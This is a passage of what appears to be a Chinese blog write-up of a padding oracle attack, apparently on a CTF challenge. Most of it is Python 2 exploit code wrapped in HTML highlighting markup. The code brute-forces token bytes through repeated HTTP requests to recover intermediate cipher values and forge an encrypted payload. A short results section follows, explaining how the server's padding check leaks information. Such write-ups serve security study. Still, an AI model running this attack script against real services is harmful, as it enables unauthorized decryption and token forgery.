    <span class="hljs-keyword">for</span> j <span class="hljs-operator">in</span> dic:
        box.append(i+j)

<span class="hljs-comment"># print box</span>
def attack(<span class="hljs-keyword">token</span>,pro,<span class="hljs-built_in">num</span>,payload):  
    <span class="hljs-built_in">global</span> <span class="hljs-keyword">mid</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> box:
        data = {
        <span class="hljs-string">'a'</span>:<span class="hljs-keyword">token</span>[:-<span class="hljs-built_in">num</span>*<span class="hljs-number">2</span>]+i+pro+payload,
        <span class="hljs-string">'token'</span>:<span class="hljs-keyword">token</span>
        }
        r = s.<span class="hljs-built_in">get</span>(url,<span class="hljs-built_in">params</span>=data)
        content = r.content
        print <span class="hljs-keyword">token</span>[:-<span class="hljs-built_in">num</span>*<span class="hljs-number">2</span>]+i+pro+payload
        <span class="hljs-keyword">if</span> <span class="hljs-string">'congratulation'</span> <span class="hljs-operator">in</span> content:
            <span class="hljs-keyword">mid</span> = chr(int(i,<span class="hljs-number">16</span>)^ord(long_to_bytes(<span class="hljs-built_in">num</span>)))+<span class="hljs-keyword">mid</span>
            <span class="hljs-comment"># print ord(mid)</span>
            pro = <span class="hljs-string">''</span>.join([<span class="hljs-string">'0'</span>*(<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(hex(ord(long_to_bytes(<span class="hljs-built_in">num</span>+<span class="hljs-number">1</span>))^ord(<span class="hljs-keyword">mid</span>[k]))[<span class="hljs-number">2</span>:]))+hex(ord(long_to_bytes(<span class="hljs-built_in">num</span>+<span class="hljs-number">1</span>))^ord(<span class="hljs-keyword">mid</span>[k]))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> k <span class="hljs-operator">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">mid</span>))])
            <span class="hljs-comment"># token = token[:-1]</span>
            print content,<span class="hljs-built_in">num</span>
            break
    <span class="hljs-constant">return</span> pro

<span class="hljs-keyword">text</span> = <span class="hljs-string">'12345678901234567890'</span>+<span class="hljs-string">'\x0b'</span>*<span class="hljs-number">12</span>
def final(<span class="hljs-keyword">token</span>,payload,<span class="hljs-built_in">result</span>):
    pro = <span class="hljs-string">''</span>
    <span class="hljs-keyword">mid</span> = <span class="hljs-string">''</span>
    <span class="hljs-built_in">global</span> <span class="hljs-keyword">mid</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> range(<span class="hljs-number">16</span>):
        <span class="hljs-comment"># print ord(pro)</span>
        pro = attack(<span class="hljs-keyword">token</span>,pro,i+<span class="hljs-number">1</span>,payload)
        <span class="hljs-comment"># print ord(pro)</span>
        <span class="hljs-comment"># token = token[:-1]</span>
    ppp = <span class="hljs-string">''</span>.join([chr(ord(<span class="hljs-built_in">result</span>[k])^ord(<span class="hljs-keyword">mid</span>[k])) <span class="hljs-keyword">for</span> k <span class="hljs-operator">in</span> range(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">mid</span>))])
    <span class="hljs-constant">return</span> binascii.b2a_hex(ppp)


payload = final(<span class="hljs-keyword">token</span>,payload,<span class="hljs-keyword">text</span>[:<span class="hljs-number">16</span>])<span class="hljs-comment">#输入第一块值（最后的返回值），第二块值，以及要解密的值</span>
print payload

print final(<span class="hljs-keyword">token</span>,payload,<span class="hljs-keyword">text</span>[<span class="hljs-number">16</span>:])
</code></pre>
<h1 id="0x03-结果分析">0x03 结果分析</h1>
<p>利用上述代码在解密的地方进行攻击 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512214813005?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
当padding值正确时会正常解密，这时就会返回false，所以登录失败出现上图结果。如果解密错误就会返回true，继续寻找正确的真值。知道全部找到为止。 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170512214735088?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></br></p></div>